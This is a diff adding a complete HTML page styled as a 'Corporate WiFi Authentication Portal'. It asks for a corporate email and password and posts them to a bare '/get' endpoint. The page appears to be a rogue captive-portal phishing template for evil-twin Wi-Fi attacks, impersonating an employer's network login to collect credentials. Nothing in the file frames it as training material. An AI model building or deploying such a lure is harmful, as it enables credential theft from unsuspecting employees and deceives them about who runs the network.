@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Corporate Network - Authentication Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#eef1f5}
+.page{width:100%;max-width:420px;padding:20px}
+.banner{background:#003366;padding:16px 24px;border-radius:8px 8px 0 0;display:flex;align-items:center;gap:12px}
+.banner .shield{font-size:28px}
+.banner div h2{color:#fff;font-size:16px;font-weight:600}
+.banner div p{color:rgba(255,255,255,.6);font-size:11px;margin-top:2px}
+.card{background:#fff;padding:32px 28px;border-radius:0 0 8px 8px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+.alert{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:10px 14px;margin-bottom:20px;font-size:12px;color:#856404;display:flex;align-items:flex-start;gap:8px}
+.alert span{font-size:16px}
+h3{font-size:16px;color:#1a1a1a;margin-bottom:4px}
+.sub{font-size:13px;color:#666;margin-bottom:22px}
+label{display:block;font-size:13px;color:#444;margin-bottom:5px;font-weight:500}
+.field{margin-bottom:16px}
+.field input{width:100%;padding:11px 14px;border:1px solid #d1d5db;border-radius:6px;font-size:14px;color:#333;transition:border .2s}
+.field input:focus{outline:none;border-color:#003366;box-shadow:0 0 0 3px rgba(0,51,102,.1)}
+.field input::placeholder{color:#aaa}
+.remember{display:flex;align-items:center;gap:8px;margin-bottom:20px}
+.remember input{accent-color:#003366}
+.remember label{font-size:13px;color:#555;margin:0}
+.btn{width:100%;padding:12px;background:#003366;border:none;border-radius:6px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .2s}
+.btn:hover{background:#004080}
+.help{text-align:center;margin-top:16px;font-size:12px;color:#888}
+.help a{color:#003366;text-decoration:none}
+.footer{text-align:center;margin-top:16px;font-size:10px;color:#aaa;line-height:1.5}
+</style>
+</head>
+<body>
+<div class="page">
+<div class="banner">
+<div class="shield">&#128737;</div>
+<div>
+<h2>Secure Network Access</h2>
+<p>Corporate WiFi Authentication Portal</p>
+</div>
+</div>
+<div class="card">
+<div class="alert">
+<span>&#9888;</span>
+<div>Authentication required. Please enter your corporate credentials to access the network.</div>
+</div>
+<h3>Sign In</h3>
+<p class="sub">Use your company email and password</p>
+<form method="POST" action="/get">
+<div class="field">
+<label>Corporate Email</label>
+<input name="email" type="text" placeholder="name@company.com" required autocomplete="off">
+</div>
+<div class="field">
+<label>Password</label>
+<input name="password" type="password" placeholder="Enter your password" required>
+</div>
+<div class="remember">
+<input type="checkbox" id="rem">
+<label for="rem">Keep me signed in on this device</label>
+</div>
+<button class="btn" type="submit">Authenticate</button>
+</form>
+<p class="help">Having trouble? Contact <a href="#">IT Support</a></p>
+</div>
+<p class="footer">This is a secured network. All traffic is monitored and logged.<br>Unauthorized access is prohibited.</p>
+</div>
+</body>
+</html>
